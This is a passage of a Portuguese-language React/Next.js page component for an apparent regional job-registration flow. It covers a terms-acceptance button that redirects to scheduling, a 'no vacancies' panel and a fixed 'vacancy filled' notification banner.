                          if (termoAutorizacao && termoContrato && termoConfidencialidade && termoDireitosImagem) {
                            // Redirecionar para página de agendamento
                            window.location.href = '/agendamento';
                          }
                        }}
                        className={`w-full px-4 py-3 rounded-md font-medium transition duration-200 ${
                          (termoAutorizacao && termoContrato && termoConfidencialidade && termoDireitosImagem)
                            ? 'bg-blue-600 text-white hover:bg-blue-700'
                            : 'bg-gray-300 text-gray-500 cursor-not-allowed'
                        }`}
                      >
                        {(termoAutorizacao && termoContrato && termoConfidencialidade && termoDireitosImagem)
                          ? 'Continuar Cadastro'
                          : 'Aceite todos os termos para continuar'
                        }
                      </button>
                      {!(termoAutorizacao && termoContrato && termoConfidencialidade && termoDireitosImagem) && (
                        <p className="text-sm text-gray-600 mt-2 text-center">
                          É necessário aceitar todos os termos para finalizar o cadastro
                        </p>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            )}

            {vagasDisponiveis === false && (
              <div className="mt-6 p-4 bg-red-50 border border-red-200 rounded-lg">
                <div className="flex items-center">
                  <i className="fas fa-times-circle text-red-500 mr-2"></i>
                  <h3 className="font-medium text-red-800">Infelizmente...</h3>
                </div>
                <p className="text-sm text-red-700 mt-1">
                  Não há vagas disponíveis para sua região no momento. Mantenha-se atualizado através do nosso portal para futuras oportunidades.
                </p>
                <Link href="/">
                  <button className="mt-3 px-4 py-2 bg-red-500 text-white rounded-md hover:bg-red-600 transition duration-200">
                    Voltar ao Portal
                  </button>
                </Link>
              </div>
            )}
          </div>

          <div className="mt-8 text-center">
            <p className="text-xs text-gray-500">
              * A verificação de disponibilidade é baseada na localização e demanda regional
            </p>
          </div>
        </div>
      </main>

      {/* Notificação de vaga preenchida - posição fixa na parte inferior */}
      {notificacaoVaga && (
        <div className="fixed bottom-4 left-4 right-4 z-50">
          <div className="bg-blue-900 bg-opacity-50 backdrop-blur-sm text-white px-8 py-4 rounded-md shadow-lg mx-auto max-w-md">
            <div className="flex items-center justify-center">
              <i className="fas fa-exclamation-triangle mr-3"></i>
              <span className="font-medium text-center" style={{textShadow: '2px 2px 4px rgba(0,0,0,0.8)'}}>
                {notificacaoVaga}
              </span>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}